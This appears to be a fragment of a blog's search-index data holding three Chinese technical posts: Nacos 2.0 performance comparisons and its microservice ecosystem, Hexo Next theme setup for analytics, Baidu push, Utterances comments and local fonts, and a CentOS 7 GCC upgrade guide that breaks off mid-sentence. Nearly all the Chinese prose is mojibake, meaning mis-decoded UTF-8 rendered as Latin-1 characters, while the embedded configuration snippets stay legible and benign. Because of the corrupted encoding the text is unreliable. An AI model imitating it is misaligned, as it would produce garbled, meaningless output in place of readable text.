æœåŠ¡å‘ç°çš„æ€§èƒ½æå‡æœåŠ¡å‘ç°åœºæ™¯ä¸»è¦å…³æ³¨å®¢æˆ·ç«¯æ•°ï¼ŒæœåŠ¡æ•°å®ä¾‹æ•°ï¼ŒåŠæœåŠ¡è®¢é˜…è€…æ•°åœ¨å¤§è§„æ¨¡åœºæ™¯ä¸‹ï¼ŒæœåŠ¡ç«¯åœ¨åŒæ­¥ï¼Œæ¨é€åŠç¨³å®šçŠ¶æ€æ—¶çš„æ€§èƒ½è¡¨ç°ã€‚åŒæ—¶è¿˜å…³æ³¨åœ¨æœ‰å¤§é‡æœåŠ¡åœ¨è¿›è¡Œä¸Šä¸‹çº¿æ—¶ï¼Œç³»ç»Ÿçš„æ€§èƒ½è¡¨ç°ã€‚ å®¹é‡åŠç¨³å®šçŠ¶æ€æµ‹è¯• è¯¥åœºæ™¯ä¸»è¦å…³æ³¨éšç€æœåŠ¡è§„æ¨¡å’Œå®¢æˆ·ç«¯å®ä¾‹è§„æ¨¡ä¸Šæ¶¨ï¼Œç³»ç»Ÿæ€§èƒ½è¡¨ç°ã€‚ å¯ä»¥çœ‹åˆ° 2.0.0 ç‰ˆæœ¬åœ¨ 10W çº§å®¢æˆ·ç«¯è§„æ¨¡ä¸‹ï¼Œèƒ½å¤Ÿç¨³å®šçš„æ”¯æ’‘ï¼Œåœ¨è¾¾åˆ°ç¨³å®šçŠ¶æ€åï¼ŒCPU çš„æŸè€—éå¸¸ä½ã€‚è™½ç„¶åœ¨æœ€åˆçš„å¤§é‡æ³¨å†Œé˜¶æ®µï¼Œç”±äºå­˜åœ¨ç¬æ—¶çš„å¤§é‡æ³¨å†Œå’Œæ¨é€ï¼Œå› æ­¤æœ‰ä¸€å®šçš„æ¨é€è¶…æ—¶ï¼Œä½†æ˜¯ä¼šåœ¨é‡è¯•åæ¨é€æˆåŠŸï¼Œä¸ä¼šå½±å“æ•°æ®ä¸€è‡´æ€§ã€‚åè§‚ 1.X ç‰ˆæœ¬ï¼Œåœ¨ 10Wã€5W çº§å®¢æˆ·ç«¯ä¸‹ï¼ŒæœåŠ¡ç«¯å®Œå…¨å¤„äº Full GC çŠ¶æ€ï¼Œæ¨é€å®Œå…¨å¤±è´¥ï¼Œé›†ç¾¤ä¸å¯ç”¨ï¼›åœ¨ 2W å®¢æˆ·ç«¯è§„æ¨¡ä¸‹ï¼Œè™½ç„¶æœåŠ¡ç«¯è¿è¡ŒçŠ¶æ€æ­£å¸¸ï¼Œä½†ç”±äºå¿ƒè·³å¤„ç†ä¸åŠæ—¶ï¼Œå¤§é‡æœåŠ¡åœ¨æ‘˜é™¤å’Œæ³¨å†Œé˜¶æ®µåå¤è¿›è¡Œï¼Œå› æ­¤è¾¾ä¸åˆ°ç¨³å®šçŠ¶æ€ï¼ŒCPU ä¸€ç›´å¾ˆé«˜ã€‚1.2W å®¢æˆ·ç«¯è§„æ¨¡ä¸‹ï¼Œå¯ä»¥ç¨³å®šè¿è¡Œï¼Œä½†ç¨³æ€æ—¶ CPU æ¶ˆè€—æ˜¯æ›´å¤§è§„æ¨¡ä¸‹ 2.0 çš„ 3 å€ä»¥ä¸Šã€‚ é¢‘ç¹å˜æ›´æµ‹è¯• è¯¥åœºæ™¯ä¸»è¦å…³æ³¨ä¸šåŠ¡å¤§è§„æ¨¡å‘å¸ƒï¼ŒæœåŠ¡é¢‘ç¹æ¨é€æ¡ä»¶ä¸‹ï¼Œä¸åŒç‰ˆæœ¬çš„ååå’Œå¤±è´¥ç‡ã€‚ é¢‘ç¹å˜æ›´æ—¶ï¼Œ2.0 å’Œ 1.X åœ¨è¾¾åˆ°ç¨³å®šçŠ¶æ€åï¼Œå‡èƒ½ç¨³å®šæ”¯æ’‘ï¼Œå…¶ä¸­ 2.0 ç”±äºä¸å†æœ‰ç¬æ—¶çš„æ¨é€é£æš´ï¼Œå› æ­¤æ¨é€å¤±è´¥ç‡å½’ 0ï¼Œè€Œ 1.X çš„ UDP æ¨é€çš„ä¸ç¨³å®šæ€§å¯¼è‡´äº†æœ‰æå°éƒ¨åˆ†æ¨é€å‡ºç°äº†è¶…æ—¶ï¼Œéœ€è¦é‡è¯•æ¨é€ã€‚ Nacos 2.0 é…ç½®ç®¡ç†çš„æ€§èƒ½æå‡ç”±äºé…ç½®æ˜¯å°‘å†™å¤šè¯»åœºæ™¯ï¼Œæ‰€ä»¥ç“¶é¢ˆä¸»è¦åœ¨å•å°ç›‘å¬çš„å®¢æˆ·ç«¯æ•°é‡ä»¥åŠé…ç½®çš„æ¨é€è·å–ä¸Šï¼Œå› æ­¤é…ç½®ç®¡ç†çš„å‹æµ‹æ€§èƒ½ä¸»è¦é›†ä¸­äºå•å°æœåŠ¡ç«¯çš„è¿æ¥å®¹é‡ä»¥åŠå¤§é‡æ¨é€çš„æ¯”è¾ƒã€‚ Nacos 2.0 è¿æ¥å®¹é‡æµ‹è¯• è¯¥åœºæ™¯ä¸»è¦å…³æ³¨ä¸åŒå®¢æˆ·ç«¯è§„æ¨¡ä¸‹çš„ç³»ç»Ÿå‹åŠ›ã€‚ Nacos 2.0 æœ€é«˜å•æœºèƒ½å¤Ÿæ”¯æ’‘ 4.2w ä¸ªé…ç½®å®¢æˆ·ç«¯è¿æ¥ï¼Œåœ¨è¿æ¥å»ºç«‹çš„é˜¶æ®µï¼Œæœ‰å¤§é‡è®¢é˜…è¯·æ±‚éœ€è¦å¤„ç†ï¼Œå› æ­¤ CPU æ¶ˆè€—è¾ƒé«˜ï¼Œä½†è¾¾åˆ°ç¨³æ€åï¼ŒCPU çš„æ¶ˆè€—ä¼šå˜å¾—å¾ˆä½ï¼Œå‡ ä¹æ²¡æœ‰æ¶ˆè€—ã€‚åè§‚ Nacos 1.Xï¼Œåœ¨å®¢æˆ·ç«¯ 6000 æ—¶ï¼Œç¨³å®šçŠ¶æ€çš„ CPU ä¸€ç›´å¾ˆé«˜ï¼Œä¸” GC é¢‘ç¹ï¼Œä¸»è¦åŸå› æ˜¯é•¿è½®è®­æ˜¯é€šè¿‡ hold è¯·æ±‚æ¥ä¿æŒè¿æ¥ï¼Œæ¯ 30s éœ€è¦å›ä¸€æ¬¡ Response å¹¶ä¸”é‡æ–°å‘èµ·è¿æ¥å’Œè¯·æ±‚ã€‚éœ€è¦åšå¤§é‡çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ŒåŒæ—¶è¿˜éœ€è¦æŒæœ‰æ‰€æœ‰ Request å’Œ Responseã€‚å½“è§„æ¨¡è¾¾åˆ° 1.2w å®¢æˆ·ç«¯æ—¶ï¼Œå·²ç»æ— æ³•è¾¾åˆ°ç¨³æ€ï¼Œæ‰€ä»¥æ— æ³•æ”¯æ’‘è¿™ä¸ªé‡çº§çš„å®¢æˆ·ç«¯æ•°ã€‚ Nacos 2.0 é¢‘ç¹æ¨é€æµ‹è¯• è¯¥åœºæ™¯å…³æ³¨ä¸åŒæ¨é€è§„æ¨¡ä¸‹çš„ç³»ç»Ÿè¡¨ç°ã€‚ åœ¨é¢‘ç¹å˜æ›´çš„åœºæ™¯ï¼Œä¸¤ä¸ªç‰ˆæœ¬éƒ½å¤„äº 6000 ä¸ªå®¢æˆ·ç«¯è¿æ¥ä¸­ã€‚æ˜æ˜¾å¯ä»¥å‘ç° 2.0 ç‰ˆæœ¬çš„æ€§èƒ½æŸè€—è¦è¿œä½äº 1.X ç‰ˆæœ¬ã€‚åœ¨ 3000tps çš„æ¨é€åœºæ™¯ä¸‹ï¼Œä¼˜åŒ–ç¨‹åº¦çº¦ä¼˜åŒ–äº† 3 å€ã€‚ Nacos 2.0 æ€§èƒ½ç»“è®º é’ˆå¯¹æœåŠ¡å‘ç°åœºæ™¯ï¼ŒNacos 2.0 èƒ½å¤Ÿåœ¨ 10W çº§è§„æ¨¡ä¸‹ï¼Œç¨³å®šè¿è¡Œï¼›ç›¸æ¯” Nacos 1.X ç‰ˆæœ¬çš„ 1.2W è§„æ¨¡ï¼Œæå‡çº¦ 10 å€ã€‚ é’ˆå¯¹é…ç½®ç®¡ç†åœºæ™¯ï¼ŒNacos 2.0 å•æœºæœ€é«˜èƒ½å¤Ÿæ”¯æ’‘ 4.2W ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼›ç›¸æ¯” Nacos 1.Xï¼Œæå‡äº† 7 å€ï¼Œä¸”æ¨é€æ—¶çš„æ€§èƒ½æ˜æ˜¾å¥½äº 1.Xã€‚ Nacos ç”Ÿæ€åŠ 2.X åç»­è§„åˆ’éšç€ Nacos ä¸‰å¹´çš„å‘å±•ï¼Œå‡ ä¹æ”¯æŒäº†æ‰€æœ‰çš„ RPC æ¡†æ¶å’Œå¾®æœåŠ¡ç”Ÿæ€ï¼Œå¹¶ä¸”å¼•é¢†äº‘åŸç”Ÿå¾®æœåŠ¡ç”Ÿæ€å‘å±•ã€‚ Nacos æ˜¯æ•´ä¸ªå¾®æœåŠ¡ç”Ÿæ€ä¸­éå¸¸æ ¸å¿ƒçš„ç»„ä»¶ï¼Œå®ƒå¯ä»¥æ— ç¼å’Œ K8s æœåŠ¡å‘ç°ä½“ç³»äº’é€šï¼Œé€šè¿‡ MCP/XDS åè®®ä¸ Istio é€šä¿¡ï¼Œå°† Nacos æœåŠ¡ä¸‹å‘ Sidecarï¼›åŒæ ·ä¹Ÿå¯ä»¥å’Œ CoreDNS è”åˆï¼Œå°† Nacos æœåŠ¡é€šè¿‡åŸŸåæ¨¡å¼æš´éœ²ç»™ä¸‹æ¸¸è°ƒç”¨ã€‚Nacos ç›®å‰å·²ç»å’Œå„ç±»å¾®æœåŠ¡ RPC æ¡†æ¶èåˆè¿›è¡ŒæœåŠ¡å‘ç°ï¼›å¦å¤–å¯ä»¥ååŠ©é«˜å¯ç”¨æ¡†æ¶ Sentinel è¿›è¡Œå„ç±»ç®¡ç†è§„åˆ™çš„æ§åˆ¶å’Œä¸‹å‘ã€‚ å¦‚æœåªä½¿ç”¨ RPC æ¡†æ¶ï¼Œæœ‰æ—¶å€™å¹¶ä¸è¶³å¤Ÿç®€å•ï¼Œå› ä¸ºéƒ¨åˆ† RPC æ¡†æ¶æ¯”å¦‚ gRPC å’Œ Thriftï¼Œè¿˜éœ€è¦è‡ªè¡Œå¯åŠ¨ Server å¹¶å‘ŠçŸ¥ Client è¯¥è°ƒç”¨å“ªä¸ª IPã€‚è¿™æ—¶å€™å°±éœ€è¦å’Œåº”ç”¨æ¡†æ¶è¿›è¡Œèåˆï¼Œæ¯”å¦‚ SCAã€Dapr ç­‰ï¼›å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ Envoy Sidecar æ¥è¿›è¡Œæµé‡æ§åˆ¶ï¼Œåº”ç”¨å±‚çš„ RPC å°±ä¸éœ€è¦çŸ¥é“æœåŠ¡ çš„ IP åˆ—è¡¨äº†ã€‚æœ€åï¼ŒNacos è¿˜å¯ä»¥å’Œå„ç±»å¾®æœåŠ¡ç½‘å…³æ‰“é€šï¼Œå®ç°æ¥å…¥å±‚çš„åˆ†å‘å’Œå¾®æœåŠ¡è°ƒç”¨ã€‚ Nacos ç”Ÿæ€åœ¨é˜¿é‡Œçš„å®è·µç›®å‰ Nacos å·²ç»å®Œæˆäº†è‡ªç ”ã€å¼€æºã€å•†ä¸šåŒ–ä¸‰ä½ä¸€ä½“çš„å»ºè®¾ï¼Œé˜¿é‡Œå†…éƒ¨çš„é’‰é’‰ã€è€ƒæ‹‰ã€é¥¿äº†ä¹ˆã€ä¼˜é…·ç­‰ä¸šåŠ¡åŸŸå·²ç»å…¨éƒ¨é‡‡ç”¨äº‘äº§å“ MSE ä¸­çš„ Nacos æœåŠ¡ï¼Œå¹¶ä¸”ä¸é˜¿é‡Œå’Œäº‘åŸç”Ÿçš„æŠ€æœ¯æ ˆæ— ç¼æ•´åˆã€‚ä¸‹é¢ä»¥é’‰é’‰ä¸ºä¾‹ç®€å•åšä¸€ä¸‹ä»‹ç»ã€‚ Nacos è¿è¡Œåœ¨å¾®æœåŠ¡å¼•æ“ MSEï¼ˆå…¨æ‰˜ç®¡çš„ Nacos é›†ç¾¤ï¼‰ä¸Šï¼Œè¿›è¡Œç»´æŠ¤å’Œå¤šé›†ç¾¤ç®¡ç†ï¼›ä¸šåŠ¡çš„å„ç±» Dubbo3 æˆ– HSF æœåŠ¡åœ¨å¯åŠ¨æ—¶ï¼Œé€šè¿‡ Dubbo3 è‡ªèº«æ³¨å†Œåˆ° Nacos é›†ç¾¤ä¸­ï¼›ç„¶å Nacos é€šè¿‡ MCP åè®®å°†æœåŠ¡ä¿¡æ¯åŒæ­¥åˆ° Istio å’Œ Ingress-Envoy ç½‘å…³ã€‚ ç”¨æˆ·æµé‡ä»åŒ—å‘è¿›å…¥é›†å›¢çš„ VPC ç½‘ç»œä¸­ï¼Œå…ˆé€šè¿‡ä¸€ä¸ªç»Ÿä¸€æ¥å…¥ Ingress-Tengine ç½‘å…³ï¼Œä»–å¯ä»¥å°†åŸŸåè§£æå¹¶è·¯ç”±åˆ°ä¸åŒçš„æœºæˆ¿ã€å•å…ƒç­‰ã€‚æœ¬å‘¨ä¹ŸåŒæ­¥æ›´æ–°äº† Tengine 2.3.3 ç‰ˆæœ¬ï¼Œå†…æ ¸å‡çº§åˆ° Nginx Core 1.18.0 ï¼Œæ”¯æŒ Dubbo åè®® ï¼Œæ”¯æŒ DTLSv1 å’Œ DTLSv1.2ï¼Œæ”¯æŒ Prometheus æ ¼å¼ï¼Œä»è€Œæå‡é˜¿é‡Œäº‘å¾®æœåŠ¡ç”Ÿæ€å®Œæ•´æ€§ã€å®‰å…¨æ€§ã€å¯è§‚æµ‹æ€§ã€‚ é€šè¿‡ç»Ÿä¸€æ¥å…¥å±‚ç½‘å…³åï¼Œç”¨æˆ·è¯·æ±‚ä¼šé€šè¿‡ Ingress-Envoy å¾®æœåŠ¡ç½‘å…³ï¼Œè½¬å‘åˆ°å¯¹åº”çš„å¾®æœåŠ¡ä¸­ï¼Œå¹¶è¿›è¡Œè°ƒç”¨ã€‚å¦‚æœéœ€è¦è°ƒç”¨åˆ°å…¶ä»–ç½‘ç»œåŸŸçš„æœåŠ¡ï¼Œä¼šé€šè¿‡ Ingress-Envoy å¾®æœåŠ¡ç½‘å…³å°†æµé‡å¯¼å…¥åˆ°å¯¹åº”çš„ VPC ç½‘ç»œä¸­ï¼Œä»è€Œæ‰“é€šä¸åŒå®‰å…¨åŸŸã€ç½‘ç»œåŸŸå’Œä¸šåŠ¡åŸŸçš„æœåŠ¡ã€‚ å¾®æœåŠ¡ä¹‹é—´çš„ç›¸äº’è°ƒç”¨ï¼Œä¼šé€šè¿‡ Envoy Sidecar æˆ–ä¼ ç»Ÿçš„å¾®æœåŠ¡è‡ªè®¢é˜…çš„æ–¹å¼è¿›è¡Œã€‚æœ€ç»ˆï¼Œç”¨æˆ·è¯·æ±‚åœ¨å„ä¸ªå¾®æœåŠ¡çš„äº’ç›¸è°ƒç”¨ä¸­ï¼Œå®Œæˆåå¹¶è¿”å›ç»™ç”¨æˆ·ã€‚ Nacos 2.X çš„è§„åˆ’Nacos 2.X å°†åœ¨ 2.0 è§£å†³æ€§èƒ½é—®é¢˜çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡æ’ä»¶åŒ–å®ç°æ–°çš„åŠŸèƒ½å¹¶æ”¹é€ å¤§é‡æ—§åŠŸèƒ½ï¼Œä½¿å¾— Nacos èƒ½å¤Ÿæ›´æ–¹ä¾¿ï¼Œæ›´æ˜“äºæ‹“å±•ã€‚ æ€»ç»“Nacos 2.0 ä½œä¸ºä¸€ä¸ªè·¨ä»£ç‰ˆæœ¬ï¼Œå½»åº•è§£å†³äº† Nacos 1.X çš„æ€§èƒ½é—®é¢˜ï¼Œå°†æ€§èƒ½æå‡äº† 10 å€ã€‚å¹¶ä¸”é€šè¿‡æŠ½è±¡å’Œåˆ†å±‚è®©æ¶æ„æ›´åŠ ç®€å•ï¼Œé€šè¿‡æ’ä»¶åŒ–æ›´å¥½çš„æ‰©å±•ï¼Œè®© Nacos èƒ½å¤Ÿæ”¯æŒæ›´å¤šåœºæ™¯ï¼Œèåˆæ›´å¹¿ç”Ÿæ€ã€‚ç›¸ä¿¡ Nacos2.X åœ¨åç»­ç‰ˆæœ¬è¿­ä»£åï¼Œä¼šæ›´åŠ æ˜“ç”¨ï¼Œè§£å†³æ›´å¤šå¾®æœåŠ¡é—®é¢˜ï¼Œå¹¶å‘ç€ Mesh åŒ–è¿›è¡Œæ›´æ·±å…¥åœ°æ¢ç´¢ã€‚ Nacosï¼šhttps://nacos.io/zh-cn Nacos Githubï¼šhttps://github.com/alibaba/nacos var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Hexo Next ä¸»é¢˜è¯¦ç»†é…ç½®ä¹‹äºŒ",url:"/posts/fef9e726.html",text:'å‰è¨€å®˜æ–¹æ•™ç¨‹ Next å®˜æ–¹æ•™ç¨‹ - å¸¸è§é—®é¢˜ Next å®˜æ–¹æ•™ç¨‹ - å†…ç½®æ ‡ç­¾ Next å®˜æ–¹æ•™ç¨‹ - ç¬¬ä¸‰æ–¹æœåŠ¡é›†æˆ ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡ä½¿ç”¨å„è½¯ä»¶çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š è½¯ä»¶ ç‰ˆæœ¬ hexo 3.9.0 hexo-cli 2.0.0 next 7.8 Next ç¬¬ä¸‰æ–¹æœåŠ¡é›†æˆ ç™¾åº¦ç»Ÿè®¡é›†æˆ ç™»å½• ç™¾åº¦ç»Ÿè®¡ï¼Œå®šä½åˆ°ç«™ç‚¹çš„ä»£ç è·å–é¡µé¢ å¤åˆ¶ hm.js? åé¢é‚£ä¸²ç»Ÿè®¡è„šæœ¬ idï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1baidu_analytics: \'tug63d4s3hlw9lz2hdtfwhtl0rxay\' Next ä¸»é¢˜è‡ªå¸¦çš„ç™¾åº¦ç»Ÿè®¡è„šæœ¬ï¼Œé»˜è®¤ä¼šå°†åšå®¢æœ¬åœ°è®¿é—®è®°å½•ä¹Ÿç»Ÿè®¡è¿›å»ï¼Œä¾‹å¦‚é€šè¿‡ 127.0.0.1 æˆ–è€… localhost è®¿é—®åšå®¢ æ›´æ”¹ themes/next/layout/_third-party/analytics/baidu-analytics.swig æ–‡ä»¶ï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ 1234567891011121314{%- if theme.baidu_analytics %} &lt;script{{ pjax }}&gt; var _hmt = _hmt || []; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?{{ theme.baidu_analytics }}"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); } })(); &lt;/script&gt;{%- endif %} è°·æ­Œç»Ÿè®¡é›†æˆæ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 123google_analytics: tracking_id: \'UA-949648306-1\' only_pageview: false Next ä¸»é¢˜è‡ªå¸¦çš„è°·æ­Œç»Ÿè®¡è„šæœ¬ï¼Œé»˜è®¤ä¼šå°†åšå®¢æœ¬åœ°è®¿é—®è®°å½•ä¹Ÿç»Ÿè®¡è¿›å»ï¼Œä¾‹å¦‚é€šè¿‡ 127.0.0.1 æˆ–è€… localhost è®¿é—®åšå®¢ æ›´æ”¹ themes/next/layout/_third-party/analytics/google-analytics.swig æ–‡ä»¶ï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ 123456789101112131415161718192021222324252627282930313233{%- if theme.google_analytics.tracking_id %} {%- if not theme.google_analytics.only_pageview %} &lt;script async src="https://www.googletagmanager.com/gtag/js?id={{ theme.google_analytics.tracking_id }}"&gt;&lt;/script&gt; &lt;script{{ pjax }}&gt; var host = window.location.host; window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { gtag(\'js\', new Date()); gtag(\'config\', \'{{ theme.google_analytics.tracking_id }}\'); } &lt;/script&gt; {%- endif %} {%- if theme.google_analytics.only_pageview %} &lt;script&gt; function sendPageView() { if (CONFIG.hostname !== location.hostname) return; var uid = localStorage.getItem(\'uid\') || (Math.random() + \'.\' + Math.random()); localStorage.setItem(\'uid\', uid); navigator.sendBeacon(\'https://www.google-analytics.com/collect\', new URLSearchParams({ v : 1, tid: \'{{ theme.google_analytics.tracking_id }}\', cid: uid, t : \'pageview\', dp : encodeURIComponent(location.pathname) })); } document.addEventListener(\'pjax:complete\', sendPageView); sendPageView(); &lt;/script&gt; {%- endif %}{%- endif %} ç™¾åº¦è‡ªåŠ¨æ¨é€é›†æˆæ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ 1baidu_push: true Next ä¸»é¢˜è‡ªå¸¦çš„ç™¾åº¦è‡ªåŠ¨æ¨é€è„šæœ¬ï¼Œé»˜è®¤åœ¨æœ¬åœ°è®¿é—®åšå®¢æ—¶ä¹Ÿä¼šè‡ªåŠ¨æ¨é€ï¼Œä¾‹å¦‚é€šè¿‡ 127.0.0.1 æˆ–è€… localhost è®¿é—®åšå®¢ æ›´æ”¹ themes/next/layout/_third-party/baidu-push.swig æ–‡ä»¶ï¼Œæ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ 123456789101112131415161718{%- if theme.baidu_push %} &lt;script{{ pjax }}&gt; (function() { var host = window.location.host; if (host.indexOf("127.0.0.1") == -1 &amp;&amp; host.indexOf("localhost") == -1) { var bp = document.createElement(\'script\'); var curProtocol = window.location.protocol.split(\':\')[0]; if (curProtocol === \'https\') { bp.src = \'https://zz.bdstatic.com/linksubmit/push.js\'; } else { bp.src = \'http://push.zhanzhang.baidu.com/push.js\'; } var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bp, s); } })(); &lt;/script&gt;{%- endif %} Utterances è¯„è®ºæ’ä»¶é›†æˆUtterances çš„åŸç†å’Œ Gitmentã€Gitalk ç±»ä¼¼ï¼Œä¾èµ– Github Issueï¼Œä½†æ˜¯ç´¢å–çš„æƒé™æ›´å°‘ã€‚é¦–å…ˆåœ¨ Github åˆ›å»ºæ–°çš„ä»“åº“ï¼ŒåŒæ—¶ä¸º Utterances åœ¨ Github ä¸Šæˆæƒï¼Œè®© Utterances æœ‰æƒé™è®¿é—®æ–°ä»“åº“çš„ Issueã€‚å½“ç„¶ä¹Ÿå¯ä»¥å•ç‹¬æŒ‡å®š Utterances èƒ½å¤Ÿè®¿é—®çš„ä»“åº“ï¼Œå¯è§å…¶æƒé™æ§åˆ¶åšçš„éå¸¸å¥½ï¼Œå…·ä½“æ“ä½œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ä¸‹é¢ç»™å‡ºçš„æ˜¯ Next å®‰è£… Utterances è¯„è®ºæ’ä»¶çš„æ–¹æ³•ä¸ç›¸å…³é…ç½®å†…å®¹ã€‚ 12345# è¿›å…¥åšå®¢çš„æ ¹ç›®å½•$ cd ${blog-root}/# å®‰è£…æ’ä»¶$ npm install github:theme-next/hexo-next-utteranc --save æ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ 1234567utteranc: enable: true repo: xxxx/xxxx # Github repo such as :TrumanDu/comments pathname: pathname theme: github-light # theme: github-light, github-dark, github-dark-orange cdn: https://utteranc.es/client.js priority: # If you want to modify priority, please config in **hexo** é…ç½®å®Œæˆåï¼Œæ¯ç¯‡æ–‡ç« çš„åº•éƒ¨éƒ½ä¼šè‡ªåŠ¨æ–°å¢è¯„è®ºåŒºï¼Œæ•ˆæœå›¾å¦‚ä¸‹ï¼š Next ä½¿ç”¨æœ¬åœ°å­—ä½“ç”±äº Next é»˜è®¤æ˜¯è°ƒç”¨ Google Fonts API æ¥è®¾ç½®å­—ä½“ï¼Œæ­£å¦‚ Next å®˜æ–¹æ‰€è¯´çš„é‚£æ ·ï¼ŒGoogle Fonts API å¹¶ä¸ç¨³å®šã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œéƒ¨åˆ†è§£å†³æ–¹æ¡ˆæ˜¯ Google Fonts API æŒ‡å‘å›½å†…çš„é•œåƒã€‚ä½†è¿™ç§æ–¹å¼å¹¶ä¸ç¨³å®šï¼Œæ›´å¥½çš„æ–¹å¼æ˜¯ï¼Œå°†å­—ä½“ä¸‹è½½åˆ°ç«™ç‚¹ä¸­ï¼Œå†åœ¨ç«™ç‚¹é‡Œä½¿ç”¨ç»å¯¹è·¯å¾„çš„æ–¹å¼å¼•ç”¨å­—ä½“ï¼Œç›¸å…³æ•™ç¨‹å¦‚ä¸‹ï¼š Next å®˜æ–¹è®¾ç½®å­—ä½“æ•™ç¨‹ Next ä¸»é¢˜å­—ä½“ä¸‹è½½ä¸ä½¿ç”¨æœ¬åœ°å­—ä½“ å½“å­—ä½“ä¸‹è½½åˆ°æœ¬åœ°ç«™ç‚¹åï¼Œæ›´æ”¹ Next ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themes/next/_config.ymlï¼Œè®¾ç½®ä»¥ä¸‹å†…å®¹ï¼Œç”±äºä½¿ç”¨äº†æœ¬åœ°å­—ä½“ï¼Œä¸å†ä½¿ç”¨ Google Fonts çš„åœ¨çº¿å­—ä½“ï¼Œå› æ­¤ç»Ÿä¸€è®¾ç½® external: false 123456789101112131415161718192021222324252627282930313233font: enable: true # å¤–é“¾å­—ä½“åº“åœ°å€ï¼Œä¾‹å¦‚ https://fonts.googleapis.com (é»˜è®¤å€¼) host: https://fonts.googleapis.com # å…¨å±€å­—ä½“ï¼Œåº”ç”¨åœ¨ body å…ƒç´ ä¸Š global: external: false family: Lato size: 16px # ç«™ç‚¹æ ‡é¢˜å­—ä½“ title: external: false family: size: # é¡µå¤´æ ‡é¢˜å­—ä½“ (h1, h2, h3, h4, h5, h6) headings: external: false family: Roboto Slab size: # æ–‡ç« å­—ä½“ posts: external: false family: # ä»£ç å­—ä½“ï¼Œåº”ç”¨äº code ä»¥åŠä»£ç å— codes: external: false family: Roboto Mono var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Centos7 å‡çº§ GCC ç‰ˆæœ¬",url:"/posts/4a5f9755.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•åœ¨ Centos 7 ç³»ç»Ÿç¯å¢ƒä¸‹å‡çº§ GCC çš„ç‰ˆæœ¬ï¼Œé€‚ç”¨äºéƒ¨åˆ†æºç åŒ…ä¾èµ–é«˜ç‰ˆæœ¬çš„ GCC è¿›è¡Œç¼–è¯‘çš„åœºæ™¯ã€‚ å®‰è£… SCL SCL å¯ä»¥åœ¨ä¸è¦†ç›–åŸæœ‰è½¯ä»¶åŒ…çš„æƒ…å†µä¸‹ä¸å…¶å…±å­˜ï¼Œç¼ºç‚¹å°±æ˜¯ä»…æ”¯æŒ 64 ä½ SCL ä»…æ”¯æŒå®‰è£… devtoolset-4ï¼ˆGCC 5.2ï¼‰ï¼ˆä¸å«ï¼‰ä¹‹åçš„ GCC ç‰ˆæœ¬ 1# yum install -y centos-release-scl å®‰è£… GCC ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£… GCCï¼Œå…¶ä¸­çš„ 9 è¡¨ç¤ºå¤§ç‰ˆæœ¬å·ï¼Œé»˜è®¤å®‰è£…å¤§ç‰ˆæœ¬ä¸‹çš„æœ€æ–°ç¨³å®šç‰ˆæœ¬ 1# yum install -y devtoolset-9 scl-utils-build å¯ç”¨ GCC ä¸´æ—¶å¯ç”¨ï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸´æ—¶å¯ç”¨ GCCï¼Œè¿™ç§æ–¹å¼é€‚ç”¨äºä¸´æ—¶åˆ‡æ¢ç³»ç»Ÿçš„ GCC 